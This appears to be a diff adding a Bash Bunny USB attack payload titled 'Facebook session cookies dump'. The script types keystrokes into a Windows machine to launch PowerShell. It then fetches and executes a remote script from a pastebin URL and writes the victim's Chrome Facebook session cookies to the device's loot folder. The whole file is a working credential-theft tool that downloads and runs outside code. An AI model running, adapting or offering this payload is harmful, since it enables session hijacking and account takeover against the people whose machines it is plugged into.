@@ -1,0 +1,48 @@
+#!/bin/bash
+#
+# Title:         Facebook session cookies dump
+# Author:        oXis (inspired by illwill)
+# Version:       1.0
+#
+# Dumps the stored session cookies from Chrome browser by downloading a Powershell script
+# then stashes them in /root/udisk/loot/FacebookSession/%ComputerName%
+# Credits to these guys for their powershell scripts:
+# https://github.com/sekirkity/BrowserGather BrowserGather.ps1
+# https://github.com/EmpireProject/Empire    Get-FoxDump.ps1
+# Also credit to illwill for the BrowerCreds payload
+
+#script 
+# Blue...............Running Script
+# Purple.............Got Browser Creds
+
+# QUACK SET_LANGUAGE gb
+#DUCKY_LANG='fr'
+
+LED R 200
+LOOTDIR=/root/udisk/loot/FacebookSession
+mkdir -p $LOOTDIR
+
+ATTACKMODE HID STORAGE
+LED B 200
+
+# wait 6 seconds for the storage to popup
+Q DELAY 6000
+Q GUI r
+Q DELAY 100
+Q STRING POWERSHELL
+Q ENTER
+Q DELAY 500
+Q STRING \$Bunny \= \(gwmi win32_volume -f \'label\=\'\'BashBunny\'\'\' \|  Select-Object -ExpandProperty DriveLetter\)
+Q ENTER
+Q DELAY 100
+
+#Dump Chrome Creds
+Q STRING IEX \(New-Object Net.WebClient\).DownloadString\(\'http:\/\/pastebin.com\/raw\/25Z8peMb\'\)\; Get-FacebookCreds \| Out-File -Append \$Bunny\\loot\\FacebookSession\\\$env:computername.txt
+Q ENTER
+Q DELAY 100
+Q STRING exit
+Q ENTER
+Q DELAY 2000
+
+sync
+LED R B 200
